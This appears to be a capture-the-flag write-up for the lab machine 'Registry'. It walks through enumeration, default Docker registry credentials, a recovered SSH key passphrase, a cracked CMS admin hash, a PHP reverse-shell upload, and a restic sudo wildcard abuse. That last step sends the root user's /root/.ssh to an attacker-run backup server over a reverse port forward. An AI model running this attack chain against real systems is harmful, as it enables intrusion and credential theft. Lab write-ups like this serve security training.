## Scan

I use masscan and nmap for a quick scan, here i use a script which create a keepnote page report from the scan, found it [here](https://github.com/roughiz/EnumNeTKeepNoteReportCreator).

We have three open ports :
```
$ create_SemiNoteFromIpWithMasscan.sh 10.10.10.159  ./keepnote/Lab/htb  Registry  tun0
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
| 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (EdDSA)
80/tcp open http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after: 2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration :

With wfuzz tool, and also in the header of nmap 443 port, i found the subdomain "docker.registry.htb"

```
ssl-cert: Subject: commonName=docker.registry.htb
```

```
$ wfuzz --hh 612 -H 'Host: FUZZ.registry.htb' -c -w subdomains-wordlist -u registry.htb
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://registry.htb/
Total requests: 132000

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                           
===================================================================

000000001:   200        0 L      0 W      0 Ch        "docker"   
```

So i add the "docker.registry.htb" to  /etc/hosts and i enumrate it with gobuster, and found the path: 

#### http://docker.registry.htb/v2/  which ask for authentication and the (admin:admin) creds works fine.

In the header of the page we have :

```
nginx/1.14.0 (Ubuntu) 
Docker-Distribution-Api-Version: registry/2.0
```

It's simple to understand that we have a docker registry V2 API here.

#### What is Docker?
Docker is a very popular platform used by developers to eliminate “works on my machine” problems when collaborating on code with co-workers. Enterprises use Docker to build agile software delivery pipelines to ship new features faster, more securely and with confidence for apps.

#### Docker registry 
The Registry is a stateless, highly scalable server side application that stores and lets you distribute Docker images using HTTP API. Earlier versions of docker registry api i.e. v1 had a few problems and hence v2 was released and considerably improves security. However it should be noted that both versions of Docker Registry have no authentication enabled by default.

The authentication to the API use the header param "Authentication", and it's simply the base64 encode of the "admin:admin" creds. we can use it with curl like :

```
$ curl -i -s -k      -H 'Authorization: Basic YWRtaW46YWRtaW4='     http://docker.registry.htb/v2/
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 25 Oct 2019 13:52:10 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 2
Connection: keep-alive
Docker-Distribution-Api-Version: registry/2.0
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubdomains
X-Frame-Options: DENY
X-Content-Type-Options: nosniff

{}
```

We can use the http API to search manually if we have any images and, pull the blobs etc, but i found a python script which automatic this process.
This [url](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/) explain how to exploit docker registry.

But before that, i enumerate the http://registry.htb/ and it appears to have some paths in this subdomain site :

```
/install (Status: 301)  ( a strange string, maybe an encrypted data or something like this)
/bolt (Status: 301)     (bolt CMS ) 
```  

And under /bolt we have :

```
gobuster  -u http://registry.htb/bolt/  -s 200,204,301,302,307,403,405,500,501,502   -w  SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://registry.htb/bolt/
[+] Threads      : 10
[+] Wordlist     : SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403,405,500,501,502
[+] Timeout      : 10s
=====================================================
2019/10/22 16:37:00 Starting gobuster
=====================================================
/files (Status: 301)
/tests (Status: 301)
/src (Status: 301)
/app (Status: 301)
/theme (Status: 301)
/vendor (Status: 301)
/extensions (Status: 301)
/bolt
Progress: 34073 / 220561 (15.45%)
```

All theses paths are forbidden, but finally found a path to authenticate into bolt CMS :

http://registry.htb/bolt/bolt/login 


Time to return and look at docker registry, the idea is to look if we can find any images about this app, and maybe find creds etc into one of blobs. 
I found a [script](https://github.com/NotSoSecure/docker_fetch/) which do all theses steps(search repository, show tags,downloads all the blobs in a directory).

I had to change this script, and add the authentication step using the header 'Authorization: Basic YWRtaW46YWRtaW4='
Found the new [script](https://github.com/roughiz/registry-walktrough/blob/master/docker_image_fetch.py) here.
Now i can use the script like :

```
$ python docker_image_fetch.py -u http://docker.registry.htb -a "Basic YWRtaW46YWRtaW4="
[+] List of Repositories:

bolt-image

Which repo would you like to download?:  bolt-image



[+] Available Tags:

latest

Which tag would you like to download?:  latest

Give a directory name:  repos
Now sit back and relax. I will download all the blobs for you in repos directory. 
Open the directory, unzip all the files and explore like a Boss. 

[+] Downloading Blob: 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b

[+] Downloading Blob: 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee

[+] Downloading Blob: 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c

[+] Downloading Blob: c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7

[+] Downloading Blob: 2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791

[+] Downloading Blob: a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4

[+] Downloading Blob: f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0

[+] Downloading Blob: d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a

[+] Downloading Blob: 8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797

[+] Downloading Blob: f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff
```

### Find any useful data from blobs :

Here i have to found any usefull data from this blobs, but firstly i have to extract theses archives like :

```
$ for i in *.tar.gz; do tar -xzvf $i; done
```

The command  exract many things, and in the first stage i can see that we have in /root/.ssh some ssh keys.

And with config and id_rsa.pub we can understand that theses keys are used to authenticate from the docker container to the Host box "registry.htb" as "bolt" user.

Ok so i tried to authenticate like :

```
$ ssh -i id_rsa bolt@10.10.10.159
Enter passphrase for key 'id_rsa':
```

Hum this key is protected with a passphrase, i used the john tool to bruteforce it like :

```
ssh2john.py id_rsa > id_rsa_bolt

```
And bruteforce like :

```
john   --wordlist=rockyou.txt id_rsa_bolt
```

but no way i had nothing.. hum so let's dig into extracting data and maybe found the passphrase password there:

The first thing it was to read the content of "/root/.bash_history", maybe user history commands helps me: 

```
cat /root/.bash_history
...
...
chmod +x /etc/profile.d/01-ssh.sh 
/etc/profile.d/01-ssh.sh 
cat /etc/profile.d/01-ssh.sh 
ps aux
vi /etc/profile.d/01-ssh.sh
/etc/profile.d/01-ssh.sh 
vi /etc/profile.d/01-ssh.sh
/etc/profile.d/01-ssh.sh 
ps aux
..
```

I got a long output, but here we have an intersting commands when user modify what appears to be an ssh script "/etc/profile.d/01-ssh.sh" maybe user want to automatize the ssh authenication, so let's see what this file contains.

```
$ cat etc/profile.d/01-ssh.sh
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

Bingo, we found the passphrase:  

#### Passphrase : GkOcz221Ftb3ugog

And now we get a shell as user bolt : 

```
$ ssh -i id_rsa bolt@10.10.10.159
Enter passphrase for key 'id_rsa': 
bolt@bolt:~$ cat user.txt | wc -c
33
bolt@bolt:~$ id
uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)
```

The first thing to do when you're working in a box using doker is to read "/proc/1/cgroup" file to know if we're into a docker container, and we can see from the output that we are in the Host:

```
$ cat /proc/1/cgroup
12:blkio:/
11:perf_event:/
10:memory:/
9:hugetlb:/
8:devices:/
7:pids:/
6:cpuset:/
5:freezer:/
4:net_cls,net_prio:/
3:rdma:/
2:cpu,cpuacct:/
1:name=systemd:/init.scope
0::/init.scope
```  

And also

```  
$ ifconfig -a
br-1bad9bd75d17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.0.0  broadcast 172.18.255.255
        inet6 fe80::42:d1ff:fefc:96f7  prefixlen 64  scopeid 0x20<link>
        ether 02:42:d1:fc:96:f7  txqueuelen 0  (Ethernet)
        RX packets 3724  bytes 142013754 (142.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 879  bytes 69048 (69.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ba:bf:01:26  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.159  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:2abf  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:2abf  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:2a:bf  txqueuelen 1000  (Ethernet)
        RX packets 46855  bytes 3299859 (3.2 MB)
        RX errors 0  dropped 71  overruns 0  frame 0
        TX packets 108298  bytes 150916920 (150.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


```  

We are in the host and we can see that docker have the subnet "br-1bad9bd75d17" .
And in the nginx conf file, the subdomain "docker.registry.htb" for the docker registry redirect to 127.0.0.1:5000 (5000 is the default registry port).
So the subdomain listen in (80/443) ports , and redirect to 127.0.0.1:5000 which redirect to 172.18.0.2:5000 like : 

```
cat /etc/nginx/sites-enabled/02.docker.registry.conf
server {
    listen 80;
    listen [::]:80;
    listen 443 ssl;
    include snippets/self-signed.conf;
    include snippets/ssl-params.conf;
    
    root /var/www/html;
    index index.html index.htm index.nginx-debian.html;

    server_name docker.registry.htb;

    location / {
        # Do not allow connections from docker 1.5 and earlier
        # docker pre-1.6.0 did not properly set the user agent on ping, catch "Go *" user agents
        if ($http_user_agent ~ "^(docker\/1\.(3|4|5(?!\.[0-9]-dev))|Go ).*$" ) {
            return 404;
        }

        proxy_pass                          http://127.0.0.1:5000;
        proxy_set_header  Host              $http_host;   # required for docker client's sake
        proxy_set_header  X-Real-IP         $remote_addr; # pass on real client's IP
        proxy_set_header  X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header  X-Forwarded-Proto $scheme;
        proxy_read_timeout                  900;
    }
}
```

```
$ ps -aux | grep "5000" 
/usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
```

The "127.18.0.2" is the address of the docker registry container like : 

```
bolt@bolt:/etc/nginx$ nmap 172.18.0.2

Starting Nmap 7.60 ( https://nmap.org ) at 2019-10-25 14:56 UTC
Nmap scan report for 172.18.0.2
Host is up (0.00012s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
```

## Privilege  escalation 

Let's escalate 

We dont have route to 10.10.14.x in the box , so let's use scp to transfer files like :

```
$ scp -i id_rsa /LinEnum/LinEnum.sh  bolt@10.10.10.159:/tmp/
Enter passphrase for key 'id_rsa': 
LinEnum.sh                                                                                                                                                                       100%   46KB 420.5KB/s   00:00
```

But nothing intersting with LinEnum.sh, and with some enumeration i found  a php file which execute a sudo command through "shell_exec()" function, and when i visit this file in the browser, the root user execute this command.

```
bolt@bolt:/var/www/html$ cat backup.php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

With pspy we have all executing commands in the box, and when i visited "backup.php" page i caught this with pspy:

```
2019/10/22 18:37:40 CMD: UID=0    PID=4218   | sudo restic backup -r rest:http://backup.registry.htb/bolt bolt 
2019/10/22 18:37:40 CMD: UID=33   PID=4217   | sh -c sudo restic backup -r rest:http://backup.registry.htb/bolt bolt 
2019/10/22 18:37:40 CMD: UID=0    PID=4219   | restic backup -r rest:http://backup.registry.htb/bolt bolt 
2019/10/22 18:40:40 CMD: UID=0    PID=4293   | /bin/rm -rf /var/www/html/bolt/files/*
...
....
2019/10/22 18:40:01 CMD: UID=0    PID=4319   | /bin/bash /root/cron.sh 
2019/10/22 18:40:01 CMD: UID=0    PID=4318   | /bin/sh -c /bin/bash /root/cron.sh 
2019/10/22 18:40:01 CMD: UID=0    PID=4317   | /usr/sbin/CRON -f 
2019/10/22 18:40:01 CMD: UID=0    PID=4320   | /bin/cp /root/config.yml /var/www/html/bolt/app/config/config.yml 
```

We have a lot of infos from pspy, but the main intersting was : 

###### The user "www-data"( uid=33) have a sudo right to execute a command as root.
###### A cron script removing all content of " /var/www/html/bolt/files/" each 4 minutes.
 
#### Shell as www-data

We don't have rights to put any php rev-shell into /var/www/html/, so the idea is to found creds to authenticate to the bolt CMS, and exploit from this point.
 
It's easy to understand from the bolt documentation that, we can use  Sqlite as db, and this file is in the directory "app/database".

Let's read the config file first 

```
$ cat config/config.yml
database:
    driver: sqlite
    databasename: bolt

```

The app use sqlite as database, and the database name is "bolt", so i upload "app/database/bolt.db" to my box and i found the creds for admin like:  

```
$ sqlite3 bolt.db 
SQLite version 3.22.0 2018-01-22 18:45:57
Enter ".help" for usage hints.
sqlite> .tables
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite> select * from bolt_users;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.x|Admin|["files://shell.php"]|1||||0||["root","everyone"]
sqlite>
```

From the hash header, it's a bcrypt hash "$2y$10" without salt.
#### The template of a hash is :  $algo$salt$hash
Here we have : $algo$hash, so we deduct that we don't have a salt.

Let's crack it with john like :

```
$ cat hash                                                                  
admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK

$ john   --wordlist=Rockyou.txt hash             
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
strawberry       (admin)
```

Now i can authenticate in the app as admin, and change the extension type file (add php extension) of uploaded files, and then upload a reverse shell and finally caught a shell as "www-data"

##### Nota: due to the iptables restriction, the reverse shell use the localhost as the ip. 

![dashbord](https://github.com/roughiz/registry-walktrough/blob/master/dash.png)

![Modify Extension](https://github.com/roughiz/registry-walktrough/blob/master/addext.png)

![Php shell](https://github.com/roughiz/registry-walktrough/blob/master/revphpshell.png)

![Shell as www-data](https://github.com/roughiz/registry-walktrough/blob/master/shell.png)

www-data user have the right to execute a command as root without password: 

```
sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

But we have the character "*" in the end of the command. From here i knwon that i can divert the normal execution and exploit this sudo right.

#### Restic backup tool
Restic is a multi-platform command line backup software program that is designed to be fast, efficient, and secure. Restic supports a variety of backends for storing backups, including a local server, SFTP server, HTTP Rest server, and a number of cloud storage providers, including Backblaze B2.
And here the user use the rest http backend as backend. So the idea is to use this command and backup the "/root/.ssh" to our box, and to do we have to port forward a local port from victim to our attacker box, to bypass iptables rules.

We have also to use the rest server api like :
##### "rest:http://${REST_USER}:${REST_PASS}@${REST_SERV}:8000/${REST_REPO}"

In this [url](https://www.kloppenborg.net/blog/backups/2019/06/12/restic-backup-server) we have an example of how to set up a backup using restic and rest-server as backend.

#### Install rest-server  

```
$ wget https://github.com/restic/restic/releases/download/v0.9.5/restic_0.9.5_linux_amd64.bz2
$ bunzip2 restic_0.9.5_linux_amd64.bz2
$ sudo cp restic_0.9.5_linux_amd64 /usr/local/bin/restic
```

#### Install restic 

```
$ wget https://github.com/restic/rest-server/releases/download/v0.9.7/rest-server-0.9.7-linux-amd64.gz
$ gzip -d rest-server-0.9.7-linux-amd64.gz
$ sudo cp rest-server-0.9.7-linux-amd64 /usr/local/bin/rest-server
```

#### From attacker :

```
$ mkdir /tmp/backup_restic && chmod 777 /tmp/backup_restic   (create the folder where repository will be create from victim)
$ touch /tmp/backup_restic/.htpasswd                 
$ htpasswd -B /tmp/backup_restic/.htpasswd zaza  (create a password for user zaza to authenticate into the repo from victim)
$ rest-server --path /tmp/backup_restic  --private-repos --append-only  
$ ssh -R 8000:127.0.0.1:8000 -i id_rsa bolt@10.10.10.159   (forward local port 8000 of rest-server to the remote victim machine with  the same port)
```

#### From victim:

```
$ restic init --repo  rest:http://zaza:zaza@127.0.0.1:8000/zaza           (create the zaza repo in the remote server)
$ sudo restic backup  -r rest:http://zaza:zaza@127.0.0.1:8000/zaza /root/.ssh  (backup the root folder /root/.ssh in the remote server)
```

Finally restoring this backup from the attacker like :

```
$ restic restore latest --target restore -r rest:http://zaza:zaza@127.0.0.1:8000/zaza
enter password for repository: 
repository bc57281b opened successfully, password is correct
restoring <Snapshot 1e87adc8 of [/root/.ssh ] at 2019-10-24 21:17:11.536993386 +0000 UTC by root@bolt> to restore
```

### Root Dance

Here i have the root keys for ssh , so i can just do :

```
$ ssh -i id_rsa root@10.10.10.159
root@bolt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@bolt:~# cat /root/root.txt | wc -c
33
root@bolt:~# 
```

And we can see why we can't create any rev shell to our box :

```
$ iptables-L
....
...
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
DROP       tcp  --  anywhere             10.0.0.0/8           tcp flags:FIN,SYN,RST,ACK/SYN
DROP       udp  --  anywhere             10.0.0.0/8       
...
...
```

Here all tcp/udp packet to 10.0.0.0/8 destination are droped.
However we can ping external machines in this range, because the ICMP flags is not in the tcp flags to drop.

